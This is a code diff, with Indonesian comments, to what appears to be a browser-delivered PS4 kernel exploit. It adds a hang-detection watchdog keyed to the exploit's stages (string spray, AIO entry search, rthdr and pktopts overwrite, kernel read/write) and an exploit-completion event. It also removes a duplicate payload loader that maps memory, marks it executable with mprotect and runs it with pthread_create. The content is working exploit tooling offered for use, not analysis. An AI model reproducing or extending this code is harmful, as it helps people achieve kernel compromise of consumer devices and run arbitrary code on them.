@@ -608,6 +608,131 @@ function getMemoryUsage() {
     return "Not available";
 }
 
+// Variabel global untuk deteksi hang
+let hangDetectionInterval = null;
+let lastProgressTime = 0;
+let exploitStage = '';
+
+// Fungsi untuk setup deteksi hang
+function setupHangDetection() {
+    log("Setting up hang detection...");
+
+    // Catat waktu awal
+    lastProgressTime = performance.now();
+    exploitStage = 'init';
+
+    // Fungsi untuk memperbarui waktu progress
+    function updateProgress(stage) {
+        lastProgressTime = performance.now();
+        exploitStage = stage;
+        log(`Progress updated: ${stage} at ${lastProgressTime}`);
+    }
+
+    // Override fungsi log untuk mendeteksi progress
+    const originalLog = window.log;
+    window.log = function(message) {
+        // Panggil fungsi log asli
+        originalLog.apply(this, arguments);
+
+        // Update progress jika pesan menunjukkan tahap baru
+        if (typeof message === 'string') {
+            if (message.includes('start string spray')) {
+                updateProgress('string_spray');
+            } else if (message.includes('find aio_entry')) {
+                updateProgress('find_aio_entry');
+            } else if (message.includes('start overwrite rthdr')) {
+                updateProgress('overwrite_rthdr');
+            } else if (message.includes('overwrite main pktopts')) {
+                updateProgress('overwrite_pktopts');
+            } else if (message.includes('achieved restricted kernel read/write')) {
+                updateProgress('kernel_rw');
+            } else if (message.includes('achieved arbitrary kernel read/write')) {
+                updateProgress('arbitrary_rw');
+            }
+        }
+    };
+
+    // Periksa secara berkala
+    hangDetectionInterval = setInterval(() => {
+        const now = performance.now();
+        const inactiveTime = now - lastProgressTime;
+
+        // Jika tidak ada progress selama lebih dari 30 detik
+        if (inactiveTime > 30000) {
+            log(`Potential hang detected in stage: ${exploitStage}! Inactive for ${Math.round(inactiveTime/1000)}s`);
+
+            // Coba recovery berdasarkan tahap
+            try {
+                if (exploitStage === 'string_spray') {
+                    log("Attempting recovery from string spray hang...");
+                    // Tampilkan pesan ke pengguna
+                    updateUIStatus('error', 'Terdeteksi hang pada string spray, mencoba recovery...');
+
+                    // Coba paksa garbage collection
+                    try {
+                        if (typeof gc === 'function') {
+                            gc();
+                        }
+                    } catch (e) {
+                        // Abaikan error
+                    }
+
+                    // Update progress untuk mencegah deteksi hang berulang
+                    updateProgress('recovery_from_string_spray');
+
+                    // Coba restart exploit setelah delay
+                    setTimeout(() => {
+                        log("Restarting exploit after hang...");
+                        location.reload();
+                    }, 2000);
+                } else if (exploitStage === 'find_aio_entry' || exploitStage === 'overwrite_rthdr') {
+                    log("Attempting recovery from AIO operation hang...");
+                    updateUIStatus('error', 'Terdeteksi hang pada operasi AIO, mencoba recovery...');
+
+                    // Update progress untuk mencegah deteksi hang berulang
+                    updateProgress('recovery_from_aio');
+
+                    // Coba restart exploit setelah delay
+                    setTimeout(() => {
+                        log("Restarting exploit after hang...");
+                        location.reload();
+                    }, 2000);
+                } else {
+                    log("Hang detected in unknown stage, restarting...");
+                    updateUIStatus('error', 'Terdeteksi hang, mencoba restart...');
+
+                    // Coba restart exploit setelah delay
+                    setTimeout(() => {
+                        location.reload();
+                    }, 2000);
+                }
+
+                // Bersihkan interval
+                clearInterval(hangDetectionInterval);
+            } catch (e) {
+                log(`Error during hang recovery: ${e.message}`);
+                // Tidak bisa melakukan apa-apa jika browser benar-benar hang
+            }
+        }
+    }, 5000); // Periksa setiap 5 detik
+
+    // Tambahkan event listener untuk mendeteksi aktivitas pengguna
+    document.addEventListener('mousemove', () => {
+        // Jika pengguna berinteraksi, kita tahu browser tidak hang
+        // Tapi kita tidak update lastProgressTime karena kita ingin mendeteksi
+        // hang dalam eksekusi exploit, bukan interaksi pengguna
+    });
+
+    // Bersihkan interval saat exploit selesai
+    window.addEventListener('exploitComplete', () => {
+        if (hangDetectionInterval) {
+            clearInterval(hangDetectionInterval);
+            hangDetectionInterval = null;
+            log("Hang detection disabled after exploit completion");
+        }
+    });
+}
+
 // Fungsi untuk mencoba race condition dengan retry - diimplementasikan secara inline
 // untuk menghindari masalah dengan async/await
 function tryRaceWithRetry(request_addr, tcp_sd, barrier, racer, sds) {
@@ -2413,6 +2538,10 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('kernel exploit succeeded!');
     updateUIStatus('success', 'Kernel exploit berhasil!');
     updateUIProgress('complete', 100);
+
+    // Trigger event untuk menandai exploit selesai
+    window.dispatchEvent(new Event('exploitComplete'));
+
     // Hapus alert untuk mencegah refresh otomatis browser PS4
     // alert("kernel exploit succeeded!");
 }
@@ -2524,6 +2653,9 @@ export async function kexploit() {
 
     // Tambahkan delay awal untuk stabilitas
     sleep(100);
+
+    // Setup deteksi hang
+    setupHangDetection();
 
     const _init_t1 = performance.now();
     try {
@@ -2647,114 +2779,6 @@ export async function kexploit() {
     updateUIStatus('success', 'Kernel exploit berhasil!');
 }
 
-// Fungsi untuk menjalankan payload dengan penanganan error
-async function runPayload() {
-    try {
-        // Tambahkan delay sebelum menjalankan payload
-        await new Promise(resolve => setTimeout(resolve, 1000));
-
-        log("Preparing to run payload...");
-
-        // Periksa apakah payload tersedia
-        if (!window.pld || window.pld.length === 0) {
-            log("ERROR: Payload not loaded or empty");
-            updateUIStatus('error', 'Payload tidak tersedia atau kosong');
-            return;
-        }
-
-        // Alokasi memori untuk payload
-        var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-
-        // Periksa apakah payload_buffer valid (tidak null, undefined, atau 0)
-        if (!payload_buffer || payload_buffer.low === 0 && payload_buffer.high === 0) {
-            log("ERROR: Failed to allocate memory for payload");
-            updateUIStatus('error', 'Gagal mengalokasikan memori untuk payload');
-            return;
-        }
-
-        log(`Allocated payload buffer at ${payload_buffer}`);
-
-        // Buat view untuk payload
-        var payload_loader = new View4(window.pld);
-        log(`Payload size: ${payload_loader.size} bytes`);
-
-        // Periksa ukuran payload
-        if (payload_loader.size < 100) {
-            log("WARNING: Payload size is suspiciously small");
-        }
-
-        // Ubah proteksi memori
-        try {
-            log(`Setting memory protection for payload at ${payload_loader.addr} with size ${payload_loader.size}`);
-
-            // Gunakan syscall_void untuk menghindari pengecekan nilai kembali
-            // mprotect mengembalikan 0 untuk sukses
-            try {
-                chain.syscall_void('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
-                log("mprotect successful");
-            } catch (e) {
-                log(`ERROR: mprotect syscall failed: ${e.message}`);
-                updateUIStatus('error', `Gagal mengubah proteksi memori: ${e.message}`);
-                return;
-            }
-        } catch (e) {
-            log(`ERROR: Exception during mprotect: ${e.message}`);
-            updateUIStatus('error', `Error saat mengubah proteksi memori: ${e.message}`);
-            return;
-        }
-
-        log("Memory protection set successfully");
-
-        // Alokasi memori untuk thread context
-        const ctx = new Buffer(0x10);
-        const pthread = new Pointer();
-        pthread.ctx = ctx;
-
-        log("Creating thread to run payload...");
-        updateUIStatus('running', 'Menjalankan payload...');
-
-        // Jalankan payload dalam thread terpisah
-        try {
-            log(`Creating thread with payload at ${payload_loader.addr} and buffer at ${payload_buffer}`);
-
-            // Tambahkan delay sebelum pthread_create
-            await new Promise(resolve => setTimeout(resolve, 500));
-
-            try {
-                // Gunakan chain.call_void untuk menghindari pengecekan nilai kembali
-                log("Calling pthread_create...");
-                chain.call_void(
-                    'pthread_create',
-                    pthread.addr,
-                    0,
-                    payload_loader.addr,
-                    payload_buffer,
-                );
-                log("pthread_create called successfully");
-            } catch (e) {
-                log(`ERROR: pthread_create call failed: ${e.message}`);
-                updateUIStatus('error', `Gagal membuat thread: ${e.message}`);
-                return;
-            }
-
-            // Tambahkan delay setelah pthread_create untuk memastikan thread berjalan
-            await new Promise(resolve => setTimeout(resolve, 500));
-
-        } catch (e) {
-            log(`ERROR: Exception during pthread_create: ${e.message}`);
-            updateUIStatus('error', `Error saat membuat thread: ${e.message}`);
-            return;
-        }
-
-        log("Payload thread created successfully");
-        updateUIStatus('success', 'Payload berhasil dijalankan');
-
-    } catch (e) {
-        log(`ERROR: Exception while running payload: ${e.message}`);
-        updateUIStatus('error', `Error saat menjalankan payload: ${e.message}`);
-    }
-}
-
 // Fungsi untuk menjalankan payload dengan penanganan error yang lebih baik
 async function runPayload() {
     try {
@@ -2819,6 +2843,9 @@ async function runPayload() {
 
         log("Payload thread created successfully");
         updateUIStatus('success', 'Payload berhasil dijalankan');
+
+        // Trigger event untuk menandai payload selesai
+        window.dispatchEvent(new Event('payloadComplete'));
 
     } catch (e) {
         log(`ERROR: Exception while running payload: ${e.message}`);
